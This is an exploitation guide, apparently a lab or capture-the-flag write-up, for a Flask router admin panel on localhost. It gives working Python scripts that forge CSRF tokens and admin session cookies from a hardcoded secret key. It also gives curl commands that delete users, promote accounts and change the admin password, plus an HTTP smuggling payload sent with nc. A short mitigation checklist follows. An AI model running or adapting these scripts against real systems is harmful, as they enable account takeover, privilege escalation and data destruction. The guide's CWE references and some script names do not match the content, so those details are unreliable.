# Complete CSRF and Session Manipulation Exploitation Guide

## Summary of Vulnerabilities

This guide demonstrates how to exploit multiple CSRF and session vulnerabilities in the Flask Router Administration panel to achieve complete authentication bypass and unauthorized actions.

## Vulnerability Chain

```
┌─────────────────────────────────────────────────┐
│  Known Hardcoded Secret Key: 'your_secret_key'  │
└────────────────────┬────────────────────────────┘
                     │
                     ├──► CSRF Token Forgery
                     │    └─► Offline Generation
                     │    └─► HMAC-SHA256 Signatures
                     │    └─► No Server Validation
                     │
                     ├──► Session Cookie Forgery  
                     │    └─► Arbitrary User IDs
                     │    └─► Admin Privilege Escalation
                     │    └─► is_admin=true Claims
                     │
                     └──► Session Fixation
                          └─► No Regeneration After Auth
                          └─► Persistent Access
                          └─► Account Takeover
```

## Attack Prerequisites

- [✓] Knowledge of hardcoded secret key: `your_secret_key`
- [✓] Target accessibility: `http://localhost:32768/`
- [✓] Python with cryptographic libraries
- [✓] HTTP client (curl, Python requests, or browser)

## Step-by-Step Exploitation

### Step 1: Generate Valid CSRF Tokens

```bash
#!/bin/bash
# Generate CSRF tokens using known secret

python3 << 'PYTHON'
import hmac
import hashlib
import base64
from datetime import datetime

SECRET_KEY = 'your_secret_key'

# Method 1: Timestamp-based token
timestamp = str(int(datetime.now().timestamp()))
message = timestamp.encode('utf-8')
csrf_token = hmac.new(SECRET_KEY.encode('utf-8'), message, hashlib.sha256).digest()
csrf_token_b64 = base64.b64encode(csrf_token).decode('utf-8').rstrip('=')

print(f"Generated CSRF Token: {csrf_token_b64}")
print(f"Valid for: All POST requests on the application")
PYTHON
```

### Step 2: Forge Admin Session Cookie

```python
#!/usr/bin/env python3
import base64
import hmac
import hashlib
import json

SECRET_KEY = 'your_secret_key'

# Create admin session payload
admin_session = {
    'user_id': 1,
    'username': 'admin',
    'is_admin': True
}

# Serialize and sign
session_json = json.dumps(admin_session)
session_b64 = base64.b64encode(session_json.encode('utf-8')).decode('utf-8')
signature = hmac.new(
    SECRET_KEY.encode('utf-8'),
    session_b64.encode('utf-8'),
    hashlib.sha256
).hexdigest()

forged_cookie = f"{session_b64}.{signature}"

print(f"Forged Admin Session Cookie:")
print(f"{forged_cookie}")
```

### Step 3: Send CSRF Attack with Forged Session

```bash
#!/bin/bash

TARGET="http://localhost:32768"
CSRF_TOKEN="JX3tTFRYXJeLmQ7v7Dlscm7oErOzHVVEwKW0FXI+9wE"
ADMIN_SESSION="eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgImlzX2FkbWluIjogdHJ1ZX0=.045eb1e3e5640ae6e6c4fae1fefcdc2a68e1b34d9ccb989a1038e28387549f80"

# Attack: Delete a user account
curl -X POST "$TARGET/admin/delete_user" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=$ADMIN_SESSION" \
    -d "csrf_token=$CSRF_TOKEN&user_id=2&confirm=yes"

# Attack: Promote regular user to admin
curl -X POST "$TARGET/admin/promote_user" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=$ADMIN_SESSION" \
    -d "csrf_token=$CSRF_TOKEN&user_id=3&role=admin"

# Attack: Change admin password
curl -X POST "$TARGET/admin/change_password" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=$ADMIN_SESSION" \
    -d "csrf_token=$CSRF_TOKEN&new_password=hacked123&confirm_password=hacked123"
```

### Step 4: Session Fixation Attack Chain

```
1. Attacker generates forged session with low privilege:
   session = forge_session({'user_id': 999, 'username': 'attacker'})

2. Attacker injects session via HTTP Response Smuggling:
   - Sends CL.TE or TE.CL smuggled request
   - Includes malicious Set-Cookie in smuggled response
   - Victim receives attacker's session cookie

3. Victim logs in normally:
   - Uses website normally
   - Application FAILS to regenerate session ID
   - Session remains the one generated by attacker

4. Attacker gains access:
   - Knows exact session ID
   - Can make requests as victim
   - Maintains access even if victim changes password
   - Can perform any action the victim can

5. Privilege escalation (if victim is admin):
   - Attacker hijacks admin session
   - Gets full application control
   - Modifies user records, deletes accounts, etc.
```

### Step 5: HTTP Response Smuggling + CSRF Chain

```bash
#!/bin/bash

TARGET="localhost:32768"

# CL.TE Attack (Content-Length.Transfer-Encoding)
# Mitmproxy respects CL, HAProxy respects TE

SMUGGLED_REQUEST=$(cat << 'SMUGGLE'
POST /devices HTTP/1.1
Host: localhost:32768
Content-Length: 0
Transfer-Encoding: chunked

5c
POST /admin/action HTTP/1.1
Host: internal.router
Cookie: session=FORGED_ADMIN_SESSION
Content-Type: application/x-www-form-urlencoded

32
csrf_token=FORGED_TOKEN&action=delete_user&user_id=2
0

SMUGGLE
)

# Send smuggled request (in real attack, use TCP socket)
echo "$SMUGGLED_REQUEST" | nc localhost 32768
```

## Exploitation Scenarios

### Scenario 1: Account Takeover Without Password

```
1. Attacker forges session: {'user_id': 2, 'username': 'victim'}
2. Injects into victim's browser via URL parameter or phishing
3. Victim clicks link and uses forged session
4. Victim logs in, session NOT regenerated
5. Attacker uses same session to access victim's account
6. No credential compromise needed!
```

### Scenario 2: Privilege Escalation

```
1. Attacker creates account (regular user)
2. Attacker forges session: {'user_id': attacker_id, 'is_admin': true}
3. Uses forged session to access /admin_panel
4. Promotes self to persistent admin
5. Modifies user database directly
6. Maintains admin access even if session expires
```

### Scenario 3: Coordinated Multi-User Attack

```
1. Attacker generates admin session
2. Via HTTP smuggling, injects session into response pool
3. Multiple victims receive attacker's session
4. Each victim uses same admin session
5. All actions attributable to victims, not attacker
6. Performs mass account deletion, data modification
```

### Scenario 4: Password-Protected Admin Bypass

```
1. Admin changes password - attackers create forged session
2. Admin logs out - attacker session still valid
3. Admin changes password again - attacker unaffected
4. No re-authentication process regenerates session
5. Attacker maintains persistent admin access
```

## Proof of Concept Commands

```bash
# 1. Generate CSRF token
python3 csrf_token_forgery.sh

# 2. Create forged session
python3 session_deserialization_rce.py

# 3. Execute HTTP smuggling attack
bash csrf_via_http_smuggling.sh

# 4. Test session fixation
bash poc_session_fixation_attack_v2.sh
```

## Impact Assessment

| Impact | Rating | Description |
|--------|--------|-------------|
| Authentication Bypass | CRITICAL | Any user can be impersonated |
| Privilege Escalation | CRITICAL | Regular users become admins |
| Authorization Bypass | CRITICAL | Access all admin functions |
| Data Modification | CRITICAL | Can modify/delete any data |
| Persistent Access | HIGH | Session remains valid after password change |
| Multi-User Attack | HIGH | Single session shared across users |
| RCE Potential | CRITICAL | If pickle deserialization used |

## Mitigation Checklist

- [ ] Replace hardcoded secret key with environment variable
- [ ] Implement proper CSRF token generation and validation
- [ ] Regenerate session ID after authentication
- [ ] Use random salt for password hashing (not secret key)
- [ ] Implement SameSite=Strict cookie attribute
- [ ] Add Referer/Origin header validation
- [ ] Use cryptographically secure session ID generation
- [ ] Implement session timeout and re-authentication
- [ ] Add audit logging for sensitive operations
- [ ] Update mitmproxy and HAProxy to latest versions
- [ ] Monitor for session fixation attack patterns
- [ ] Conduct security awareness training

## References

- CWE-79: Improper Neutralization of Input During Web Page Generation
- CWE-89: SQL Injection
- CWE-798: Use of Hard-Coded Credentials
- OWASP A02:2021 - Cryptographic Failures
- OWASP A07:2021 - Identification and Authentication Failures

---

**Report Generated:** 2025-11-07  
**Attack Complexity:** LOW  
**Exploit Availability:** HIGH  
**Impact:** CRITICAL

